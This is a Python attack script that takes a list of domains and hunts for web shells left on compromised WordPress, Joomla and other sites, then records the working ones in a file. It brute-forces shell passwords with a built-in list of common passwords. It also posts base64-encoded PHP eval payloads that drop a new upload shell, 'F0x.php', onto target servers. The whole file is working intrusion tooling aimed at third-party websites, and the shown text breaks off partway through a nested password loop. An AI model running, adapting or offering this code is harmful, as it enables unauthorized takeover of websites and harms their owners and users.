#Coded & Obfuscated By Hamza Anonime
#Deobfuscated By @f4c3r100 :D
import sys, os
import requests , re , datetime
from multiprocessing.dummy import Pool
from colorama import Fore								
from colorama import Style								
from pprint import pprint								
from colorama import init												
init(autoreset=True)
# @hamzaanonime
fr  =   Fore.RED											
fc  =   Fore.CYAN											
fw  =   Fore.WHITE											
fg  =   Fore.GREEN										
sd  =   Style.DIM											
sn  =   Style.NORMAL										

print("""\033[32m

                        M
                       dM
                       MMr
                      4MMML                  .
                      MMMMM.                xf
      .              "MMMMM               .MM-
       Mh..          +MMMMMM            .MMMM
       .MMM.         .MMMMML.          MMMMMh
        )MMMh.        MMMMMM         MMMMMMM
         3MMMMx.     'MMMMMMf      xnMMMMMM"
         '*MMMMM      MMMMMM.     nMMMMMMP"
           *MMMMMx    "MMMMM\\    .MMMMMMM=
            *MMMMMh   "MMMMM"   JMMMMMMP
              MMMMMM   3MMMM.  dMMMMMM            .
               MMMMMM  "MMMM  .MMMMM(        .nnMP"
   =..          *MMMMx  MMM"  dMMMM"    .nnMMMMM*
     "MMn...     'MMMMr 'MM   MMM"   .nMMMMMMM*"
      "4MMMMnn..   *MMM  MM  MMP"  .dMMMMMMM""
        ^MMMMMMMMx.  *ML "M .M*  .MMMMMM**"
           *PMMMMMMhn. *x > M  .MMMM**""
              ""**MMMMhx/.h/ .=*"
                       .3P"%....
                       "*MMn
     \033[7;33mHamza Anonime\033[00m \033[96m(0day Marijuana)\033[00m \033[07;37m@hamzaanonime\033[00m

\033[7;96mNOTE \033[00m: \033[3mthis Script Exploit Vulns  From list Domains\033[00m
                                          """)
try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
	path =  str(sys.argv[0]).split('\\')
	exit('[!] Enter <'+path[len(path)-1] + '> <sites.txt>')

print('   {}[1] \033[07;33mWordPress Exploit\033[00m \033[32m(60+)'.format(fg))
print('   {}[2] \033[07;33mJoomla Exploit\033[00m \033[32m(20+)'.format(fg))
print('   {}[3] \033[07;33mOther Filemanager Exploit\033[00m \033[32m(500+)'.format(fg))
print('   {}[4] \033[07;33mWordPress & Joomla & Other\033[00m \033[32m(660+)'.format(fg,fr))
print("   {}[0] Exit".format(fr))
w = int(input('\033[07;34m Enter Number \033[00m====> : '))	
print('')

def URL(url):
	if url[-1] == "/":
		pattern = re.compile('(.*)/')
		site = re.findall(pattern,url)
		url = site[0]
	if url[:7] != "http://" and url[:8] != "https://":
		url = "http://" + url
	return url
	
def WordPress1(site):
	try:
		site = URL(site)
		SH1 = site+'/wp-content/plugins/upspy/index.php'
		SH2 = site+'/wp-content/plugins/ubh/index.php'
		SH3 = site+'/wp-content/plugins/vwcleanerplugin/bump.php?cache'
		SH4 = site+'/wp-content/themes/gaukingo/db.php'
		SH5 = site+'/wp-content/plugins/three-column-screen-layout/db.php'
		SH6 = site+'/wp-content/plugins/xichang/x.php?xi'
		SH7 = site+'/wp-content/plugins/html404/index.html'
		SH8 = site+'/wp-content/plugins/wp-db-ajax-made/wp-ajax.php'
		SH9 = site+'/wp-admin/shapes.php'
		SH10 = site+'/XxX.php'
		SH11 = site+'/Marvins.php'
		SH12 = site+'/wp-includes/css/modules.php'
		SH13 = site+'/olux.php'		
		SH15 = site+'/indoxploit.php'
		SH19 = site+'/wso.php'
		SH20 = site+'/wp-content/plugins/css-ready-sel/file.php'
		SH21 = site+'/wp-content/plugins/css-ready/file.php'
		SH22 = site+'/wp-content/think.php'
		
		try :
			modules_check = requests.get(SH12,timeout=15).content
			wso_check = requests.get(SH19,timeout=15).content
		except :
			pass
		password_nhzgrf = {'pass':'nhzgrf'}
		password_root = {'pass':'root'}
		password_r00t = {'pass':'r00t'}
		password_admin = {'pass':'admin'}
		password_t00r = {'pass':'t00r'}
		password_123 = {'pass':'123'}
		password_1234 = {'pass':'1234'}
		password_12345 = {'pass':'12345'}
		password_123456 = {'pass':'123456'}
		password_123123 = {'pass':'123123'}
		password_123321 = {'pass':'123321'}
		password_123456789 = {'pass':'123456789'}
		password_1234567890 = {'pass':'1234567890'}
		password_haurgeulis = {'pass':'haurgeulis'}
		password_rehan = {'password':'rehan'}
		modules_upload = {'itongtong':'eval(base64_decode("JGZvPWZvcGVuKCRfU0VSVkVSWyJET0NVTUVOVF9ST09UIl0uIi9GMHgucGhwIiwidyIpOwpmd3JpdGUoJGZvLGJhc2U2NF9kZWNvZGUoJ1BEOXdhSEFOQ21WamFHOGdJa2hoWTJ0bFpDQkNlU0JCYm05dWVXMXZkWE5HYjNoY2JpSTdEUXA3RFFva2MyRjNNU0E5SUNSZlJrbE1SVk5iSjJacGJHVW5YVnNuZEcxd1gyNWhiV1VuWFRzTkNpUnpZWGN5SUQwZ0pGOUdTVXhGVTFzblptbHNaU2RkV3lkdVlXMWxKMTA3RFFwbFkyaHZJQ0k4Wm05eWJTQnRaWFJvYjJROUoxQlBVMVFuSUdWdVkzUjVjR1U5SjIxMWJIUnBjR0Z5ZEM5bWIzSnRMV1JoZEdFblBnMEtQR2x1Y0hWMElIUjVjR1U5SjJacGJHVW5ibUZ0WlQwblptbHNaU2NnTHo0TkNqeHBibkIxZENCMGVYQmxQU2R6ZFdKdGFYUW5JSFpoYkhWbFBTZDFjR3h2WVdRZ2MyaGxiR3duSUM4K0RRbzhMMlp2Y20wK0lqc05DbTF2ZG1WZmRYQnNiMkZrWldSZlptbHNaU2drYzJGM01Td2tjMkYzTWlrN0RRcDlEUW8vUGc9PScpKTs="));'}		
		modules_upload2 = {'itongtong':'eval(base64_decode("JGZvPWZvcGVuKCJGMHgucGhwIiwidyIpOwpmd3JpdGUoJGZvLGJhc2U2NF9kZWNvZGUoJ1BEOXdhSEFOQ21WamFHOGdJa2hoWTJ0bFpDQkNlU0JCYm05dWVXMXZkWE5HYjNoY2JpSTdEUXA3RFFva2MyRjNNU0E5SUNSZlJrbE1SVk5iSjJacGJHVW5YVnNuZEcxd1gyNWhiV1VuWFRzTkNpUnpZWGN5SUQwZ0pGOUdTVXhGVTFzblptbHNaU2RkV3lkdVlXMWxKMTA3RFFwbFkyaHZJQ0k4Wm05eWJTQnRaWFJvYjJROUoxQlBVMVFuSUdWdVkzUjVjR1U5SjIxMWJIUnBjR0Z5ZEM5bWIzSnRMV1JoZEdFblBnMEtQR2x1Y0hWMElIUjVjR1U5SjJacGJHVW5ibUZ0WlQwblptbHNaU2NnTHo0TkNqeHBibkIxZENCMGVYQmxQU2R6ZFdKdGFYUW5JSFpoYkhWbFBTZDFjR3h2WVdRZ2MyaGxiR3duSUM4K0RRbzhMMlp2Y20wK0lqc05DbTF2ZG1WZmRYQnNiMkZrWldSZlptbHNaU2drYzJGM01Td2tjMkYzTWlrN0RRcDlEUW8vUGc9PScpKTs="));'}
		modules_upload3 = {'itongtong':'eval(base64_decode("JGZvPWZvcGVuKCRfU0VSVkVSWyJET0NVTUVOVF9ST09UIl0uIi93cC1jb250ZW50L3VwbG9hZHMvRjB4LnBocCIsInciKTsKZndyaXRlKCRmbyxiYXNlNjRfZGVjb2RlKCdQRDl3YUhBTkNtVmphRzhnSWtoaFkydGxaQ0JDZVNCQmJtOXVlVzF2ZFhOR2IzaGNiaUk3RFFwN0RRb2tjMkYzTVNBOUlDUmZSa2xNUlZOYkoyWnBiR1VuWFZzbmRHMXdYMjVoYldVblhUc05DaVJ6WVhjeUlEMGdKRjlHU1V4RlUxc25abWxzWlNkZFd5ZHVZVzFsSjEwN0RRcGxZMmh2SUNJOFptOXliU0J0WlhSb2IyUTlKMUJQVTFRbklHVnVZM1I1Y0dVOUoyMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRW5QZzBLUEdsdWNIVjBJSFI1Y0dVOUoyWnBiR1VuYm1GdFpUMG5abWxzWlNjZ0x6NE5DanhwYm5CMWRDQjBlWEJsUFNkemRXSnRhWFFuSUhaaGJIVmxQU2QxY0d4dllXUWdjMmhsYkd3bklDOCtEUW84TDJadmNtMCtJanNOQ20xdmRtVmZkWEJzYjJGa1pXUmZabWxzWlNna2MyRjNNU3drYzJGM01pazdEUXA5RFFvL1BnPT0nKSk7"));'}		
		if 'United Tunsian Scammers' in requests.get(SH1,timeout=15).content :
			conspy = requests.get(site+'/wp-content/plugins/upspy/con.php',timeout=15).content
			upspy = requests.get(site+'/wp-content/plugins/upspy/up.php',timeout=15).content
			wsospy = requests.get(site+'/wp-content/plugins/upspy/sllolx.php',timeout=15).content
			if 'Web Console' in conspy :
				print(' # '+site +'/ --> {}[UPspy]'.format(fg))
				if 'http://www.ubhteam.org/images/UBHFinal1.png' in upspy :
					if 'WSO 2.6' in wsospy :
						with open('Shells.txt', mode='a') as d:
							d.write(site+'/wp-content/plugins/upspy/con.php#ubh@ubh | '+site+'/wp-content/plugins/upspy/up.php | '+site+'/wp-content/plugins/upspy/sllolx.php')
					else :
						with open('Shells.txt', mode='a') as d:
							d.write(site+'/wp-content/plugins/upspy/con.php#ubh@ubh | '+site+'/wp-content/plugins/upspy/up.php')
				else :
					if 'WSO 2.6' in wsospy :
						with open('Shells.txt', mode='a') as d:
							d.write(site+'/wp-content/plugins/upspy/con.php#ubh@ubh | '+site+'/wp-content/plugins/upspy/sllolx.php')
					else :		
						with open('Shells.txt', mode='a') as d:
							d.write(site+'/wp-content/plugins/upspy/con.php#ubh@ubh')
			elif 'http://www.ubhteam.org/images/UBHFinal1.png' in upspy :
				print(' # '+site +'/ --> {}[UPspy]'.format(fg))
				if 'WSO 2.6' in wsospy :
					with open('Shells.txt', mode='a') as d:
						d.write(site+'/wp-content/plugins/upspy/up.php | '+site+'/wp-content/plugins/upspy/sllolx.php')
				else :
					with open('Shells.txt', mode='a') as d:
						d.write(site+'/wp-content/plugins/upspy/up.php')
			elif 'WSO 2.6' in wsospy :
				print(' # '+site +'/ --> {}[UPspy]'.format(fg))
				with open('Shells.txt', mode='a') as d:
					d.write(site+'/wp-content/plugins/upspy/sllolx.php')
			else :
				print(' # '+site +' --> {}[Failed]'.format(fr))
		elif 'United Bangladeshi Hackers' in requests.get(SH2,timeout=15).content :
			conubh = requests.get(site+'/wp-content/plugins/ubh/con.php',timeout=15).content
			upubh = requests.get(site+'/wp-content/plugins/ubh/up.php',timeout=15).content
			if 'Web Console' in conubh :
				print(' # '+site +'/ --> {}[UBH]'.format(fg))
				if 'http://www.ubhteam.org/images/UBHFinal1.png' in upubh :
					with open('Shells.txt', mode='a') as d:
						d.write(site+'/wp-content/plugins/ubh/con.php#ubh@ubh | '+site+'/wp-content/plugins/ubh/up.php')
				else :
					with open('Shells.txt', mode='a') as d:
						d.write(site+'/wp-content/plugins/ubh/con.php#ubh@ubh')
			elif 'http://www.ubhteam.org/images/UBHFinal1.png' in upubh :
				print(' # '+site +'/ --> {}[UBH]'.format(fg))
				with open('Shells.txt', mode='a') as d:
					d.write(site+'/wp-content/plugins/ubh/up.php')
			else :
				print(' # '+site +' --> {}[Failed]'.format(fr))
		elif '[UNAME]:' in requests.get(SH3,timeout=15).content :	
			print(' # '+site +'/ --> {}[VWCleaner]'.format(fg))
			with open('Shells.txt', mode='a') as d:		
				d.write(SH3+'')
		elif 'xichang1' in requests.get(SH6,timeout=15).content :	
			print(' # '+site +'/ --> {}[xichang]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH6+'')
		elif 'Hckd By? Html404' in requests.get(SH7,timeout=15).content :
			xccc = requests.get(site+'/wp-content/plugins/html404/xccc.php',timeout=15).content
			cry = requests.get(site+'/wp-content/plugins/html404/cry.php.pjpeg',timeout=15).content
			wso25 = requests.get(site+'/wp-content/plugins/html404/wso25.php',timeout=15).content
			if 'Html404' in xccc :
				print(' # '+site +'/ --> {}[Html404]'.format(fg))
				if 'JEMBOETS' in cry :
					if 'WSO 2.5' in wso25 :
						with open('Shells.txt', mode='a') as d:
							d.write(site+'/wp-content/plugins/html404/xccc.php | '+site+'/wp-content/plugins/html404/cry.php.pjpeg | '+site+'/wp-content/plugins/html404/wso25.php')
					else :
						with open('Shells.txt', mode='a') as d:
							d.write(site+'/wp-content/plugins/html404/xccc.php | '+site+'/wp-content/plugins/html404/cry.php.pjpeg')
				else :
					if 'WSO 2.5' in wso25 :
						with open('Shells.txt', mode='a') as d:
							d.write(site+'/wp-content/plugins/html404/xccc.php | '+site+'/wp-content/plugins/html404/wso25.php')
					else :		
						with open('Shells.txt', mode='a') as d:
							d.write(site+'/wp-content/plugins/html404/xccc.php')
			elif 'JEMBOETS' in cry :	
				print(' # '+site +'/ --> {}[Html404]'.format(fg))
				if 'WSO 2.5' in wso25 :
					with open('Shells.txt', mode='a') as d:
						d.write(site+'/wp-content/plugins/html404/cry.php.pjpeg | '+site+'/wp-content/plugins/html404/wso25.php')
				else :
					with open('Shells.txt', mode='a') as d:
						d.write(site+'/wp-content/plugins/html404/cry.php.pjpeg')
			elif 'WSO 2.5' in wso25 :
				print(' # '+site +'/ --> {}[Html404]'.format(fg))
				with open('Shells.txt', mode='a') as d:
					d.write(site+'/wp-content/plugins/html404/wso25.php')
			else :
				print(' # '+site +' --> {}[Failed]'.format(fr))
		elif '<title>Mister Spy</title>' in requests.get(SH9,timeout=15).content :	
			print(' # '+site +'/ --> {}[MisterSpy]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH9+'')
		elif 'WSO 2.6' in requests.get(SH13,timeout=15).content :	
			print(' # '+site +'/ --> {}[Olux]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH13+'')
		elif '<title>IndoXploit</title>' in requests.get(SH15,timeout=15).content :	
			print(' # '+site +'/ --> {}[IndoXploit]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH15+'#IndoXploit')
		elif '#p@@#' in requests.get(SH25,timeout=15).content :
			print(' # '+site +'/ --> {}[License]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH25+'')
		elif '<' not in modules_check and '/wp-includes/css' in  modules_check :
			upShell =  requests.post(SH12,data=modules_upload,timeout=15)
			check = requests.get(site+'/F0x.php',timeout=15).content
			if 'AnonymousFox' in check :
				print(' # '+site +'/ --> {}[ChinafansModules]'.format(fg))
				with open('Shells.txt', mode='a') as d:
					d.write(SH12+'#itongtong [POST] | {}/F0x.php [Succeeded]'.format(site))
			else :
				upShell =  requests.post(SH12,data=modules_upload2,timeout=15)
				check = requests.get(site+'/wp-includes/css/F0x.php',timeout=15).content
				if 'AnonymousFox' in check :
					print(' # '+site +'/ --> {}[ChinafansModules]'.format(fg))
					with open('Shells.txt', mode='a') as d:
						d.write(SH12+'#itongtong [POST] | {}/wp-includes/css/F0x.php [Succeeded]'.format(site))
				else :
					upShell =  requests.post(SH12,data=modules_upload3,timeout=15)
					check = requests.get(site+'/wp-content/uploads/F0x.php',timeout=15).content
					if 'AnonymousFox' in check :
						print(' # '+site +'/ --> {}[ChinafansModules]'.format(fg))
						with open('Shells.txt', mode='a') as d:
							d.write(SH12+'#itongtong [POST] | {}/wp-content/uploads/F0x.php [Succeeded]'.format(site))
					else :
						print(' # '+site +' --> {}[Failed]'.format(fr))
		elif ' name=pass' in requests.get(SH4,timeout=15).content :
			nhzgrf = requests.post(SH4,data=password_nhzgrf,timeout=15).content
			if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
				print(' # '+site +'/ --> {}[Gaukingo]'.format(fg))
				with open('Shells.txt', mode='a') as d:
					d.write(SH4+'#nhzgrf')
			else :
				proot = requests.post(SH4,data=password_root,timeout=15).content
				if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
					print(' # '+site +'/ --> {}[Gaukingo]'.format(fg))
					with open('Shells.txt', mode='a') as d:
						d.write(SH4+'#root')
				else :
					pr00t = requests.post(SH4,data=password_r00t,timeout=15).content
					if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
						print(' # '+site +'/ --> {}[Gaukingo]'.format(fg))
						with open('Shells.txt', mode='a') as d:
							d.write(SH4+'#r00t')
					else :
						padmin = requests.post(SH4,data=password_admin,timeout=15).content
						if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
							print(' # '+site +'/ --> {}[Gaukingo]'.format(fg))
							with open('Shells.txt', mode='a') as d:
								d.write(SH4+'#admin')
						else :
							pt00r = requests.post(SH4,data=password_t00r,timeout=15).content
							if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
								print(' # '+site +'/ --> {}[Gaukingo]'.format(fg))
								with open('Shells.txt', mode='a') as d:
									d.write(SH4+'#t00r')
							else :
								p123 = requests.post(SH4,data=password_123,timeout=15).content
								if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
									print(' # '+site +'/ --> {}[Gaukingo]'.format(fg))
									with open('Shells.txt', mode='a') as d:
										d.write(SH4+'#123')
								else :
									p1234 = requests.post(SH4,data=password_1234,timeout=15).content
									if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
										print(' # '+site +'/ --> {}[Gaukingo]'.format(fg))
										with open('Shells.txt', mode='a') as d:
											d.write(SH4+'#1234')
									else :
										p12345 = requests.post(SH4,data=password_12345,timeout=15).content
										if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
											print(' # '+site +'/ --> {}[Gaukingo]'.format(fg))
											with open('Shells.txt', mode='a') as d:
												d.write(SH4+'#12345')
										else :
											p123456 = requests.post(SH4,data=password_123456,timeout=15).content
											if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
												print(' # '+site +'/ --> {}[Gaukingo]'.format(fg))
												with open('Shells.txt', mode='a') as d:
													d.write(SH4+'#123456')
											else :
												p123123 = requests.post(SH4,data=password_123123,timeout=15).content
												if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
													print(' # '+site +'/ --> {}[Gaukingo]'.format(fg))
													with open('Shells.txt', mode='a') as d:
														d.write(SH4+'#123123')
												else :
													p123321 = requests.post(SH4,data=password_123321,timeout=15).content
													if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
														print(' # '+site +'/ --> {}[Gaukingo]'.format(fg))
														with open('Shells.txt', mode='a') as d:
															d.write(SH4+'#123321')
													else :
														p123456789 = requests.post(SH4,data=password_123456789,timeout=15).content
														if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
															print(' # '+site +'/ --> {}[Gaukingo]'.format(fg))
															with open('Shells.txt', mode='a') as d:
																d.write(SH4+'#123456789')
														else :
															p1234567890 = requests.post(SH4,data=password_1234567890,timeout=15).content
															if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																print(' # '+site +'/ --> {}[Gaukingo]'.format(fg))
																with open('Shells.txt', mode='a') as d:
																	d.write(SH4+'#1234567890')
															else :
																phaurgeulis = requests.post(SH4,data=password_haurgeulis,timeout=15).content
																if 'Andela1C3' in phaurgeulis  :
																	print(' # '+site +'/ --> {}[Gaukingo]'.format(fg))
																	with open('Shells.txt', mode='a') as d:
																		d.write(SH4+'#haurgeulis')
																else :
																	print(' # '+site +' --> {}[Failed]'.format(fr))
		elif ' name=pass' in requests.get(SH5,timeout=15).content :
			nhzgrf_ScreenLayout = requests.post(SH5,data=password_nhzgrf,timeout=15).content
			if 'WSO' in nhzgrf_ScreenLayout :
				print(' # '+site +'/ --> {}[ScreenLayout]'.format(fg))
				with open('Shells.txt', mode='a') as d:
					d.write(SH5+'#nhzgrf')
			else :
				print(' # '+site +' --> {}[Failed]'.format(fr))
		elif ' name=pass' in requests.get(SH8,timeout=15).content :	
			proot_Ajax = requests.post(SH8,data=password_root,timeout=15).content
			if 'WSO' in proot_Ajax :
				print(' # '+site +'/ --> {}[Ajax]'.format(fg))
				with open('Shells.txt', mode='a') as d:
					d.write(SH8+'#root')
			else :
				print(' # '+site +' --> {}[Failed]'.format(fr))
		elif 'Tryag File Manager' in requests.get(SH10,timeout=15).content :	
			print(' # '+site +'/ --> {}[Tryag]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH10+'')
		elif 'config root man' in requests.get(SH11,timeout=15).content :	
			print(' # '+site +'/ --> {}[Marvins]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH11+'')
		elif 'Windows' in wso_check and 'Upload file:' in wso_check :
			print(' # '+site +'/ --> {}[WSO]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH19+'')
		elif 'Tryag File Manager' in requests.get(SH20,timeout=15).content :
			print(' # '+site +'/ --> {}[CssReadySel]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH20+'')
		elif 'Tryag File Manager' in requests.get(SH21,timeout=15).content :
			print(' # '+site +'/ --> {}[CssReady]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH21+'')				
		elif '<title>Legion</title>' in requests.get(SH22,timeout=15).content :
			print(' # '+site +'/ --> {}[Legion]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH22+'')				
		else :
			print(' # '+site +' --> {}[Failed]'.format(fr))
	except : 
		print(' # '+site +' --> {}[Failed]'.format(fr))

def Other(site):		
	try :
		site = URL(site)

		SH1_O = site+'/olux.php'
		SH2_O = site+'/indoxploit.php'
		SH3_O = site+'/Marvins.php'		
		SH4_O = site+'/wso.php'
		SH5_O = site+'/images/'
		SH6_O = site+'/uploads/'
		SH7_O = site+'/img/'
		SH8_O = site+'/upload/'
		SH9_O = site+'/gallery/'
		SH10_O = site+'/files/'
		SH11_O = site+'/pdf/'
		SH12_O = site+'/docs/'
		SH13_O = site+'/up.php'
		SH14_O = site+'/upload.php'
		SH15_O = site+'/shell.php'
		
		password_nhzgrf = {'pass':'nhzgrf'}
		password_root = {'pass':'root'}
		password_r00t = {'pass':'r00t'}
		password_admin = {'pass':'admin'}
		password_t00r = {'pass':'t00r'}
		password_123 = {'pass':'123'}
		password_1234 = {'pass':'1234'}
		password_12345 = {'pass':'12345'}
		password_123456 = {'pass':'123456'}
		password_123123 = {'pass':'123123'}
		password_123321 = {'pass':'123321'}
		password_123456789 = {'pass':'123456789'}
		password_1234567890 = {'pass':'1234567890'}
		password_haurgeulis = {'pass':'haurgeulis'}
		password_rehan = {'password':'rehan'}

		pattern_php = re.compile('<a href="(.*).php">')	

		if 'WSO 2.6' in requests.get(SH1_O,timeout=15).content :	
			print(' # '+site +'/ --> {}[Olux]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH1_O+'')
		elif '<title>IndoXploit</title>' in requests.get(SH2_O,timeout=15).content :	
			print(' # '+site +'/ --> {}[IndoXploit]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH2_O+'#IndoXploit')
		elif '<title>IndoXploit</title>' in requests.get(SH2_O,timeout=15).content :	
			print(' # '+site +'/ --> {}[IndoXploit]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH2_O+'#IndoXploit')
		else :
			wso_check = requests.get(SH4_O,timeout=15).content
			if 'Windows' in wso_check and 'Upload file:' in wso_check :
				print(' # '+site +'/ --> {}[WSO]'.format(fg))
				with open('Shells.txt', mode='a') as d:
					d.write(SH4_O+'')
			else :
				images_check = requests.get(SH5_O,timeout=15).content
				if 'Index of' in images_check and '.php' in images_check :
					shells = []
					if re.findall(pattern_php,images_check):
						shells = re.findall(pattern_php,images_check)			
					for shell in shells:
						sh_check = requests.get(SH5_O+shell+'.php',timeout=15).content
						if ' type="file"' in sh_check or ' type=\'file\'' in sh_check or ' type= "file"' in sh_check or ' type= \'file\'' in sh_check or ' type = "file"' in sh_check or ' type = \'file\'' in sh_check or ' type ="file"' in sh_check or ' type =\'file\'' in sh_check or ' type=file' in sh_check or ' type =file' in sh_check or ' type= file' in sh_check or ' type = file' in sh_check or 'Upload</a> ]</li><li>[' in sh_check or 'upload</a><li><a>Sym' in sh_check :
							print(' # '+site +'/ --> {}[Vuln]'.format(fg))
							with open('Shells.txt', mode='a') as d:
								d.write(SH5_O+shell+'.php')
						elif ' name=pass' in sh_check :
							nhzgrf = requests.post(SH5_O+shell+'.php',data=password_nhzgrf,timeout=15).content
							if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
								print(' # '+site +'/ --> {}[Vuln]'.format(fg))
								with open('Shells.txt', mode='a') as d:
									d.write(SH5_O+shell+'.php'+'#nhzgrf')
							else :
								proot = requests.post(SH5_O+shell+'.php',data=password_root,timeout=15).content
								if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
									print(' # '+site +'/ --> {}[Vuln]'.format(fg))
									with open('Shells.txt', mode='a') as d:
										d.write(SH5_O+shell+'.php'+'#root')
								else :
									pr00t = requests.post(SH5_O+shell+'.php',data=password_r00t,timeout=15).content
									if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
										print(' # '+site +'/ --> {}[Vuln]'.format(fg))
										with open('Shells.txt', mode='a') as d:
											d.write(SH5_O+shell+'.php'+'#r00t')
									else :
										padmin = requests.post(SH5_O+shell+'.php',data=password_admin,timeout=15).content
										if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
											print(' # '+site +'/ --> {}[Vuln]'.format(fg))
											with open('Shells.txt', mode='a') as d:
												d.write(SH5_O+shell+'.php'+'#admin')
										else :
											pt00r = requests.post(SH5_O+shell+'.php',data=password_t00r,timeout=15).content
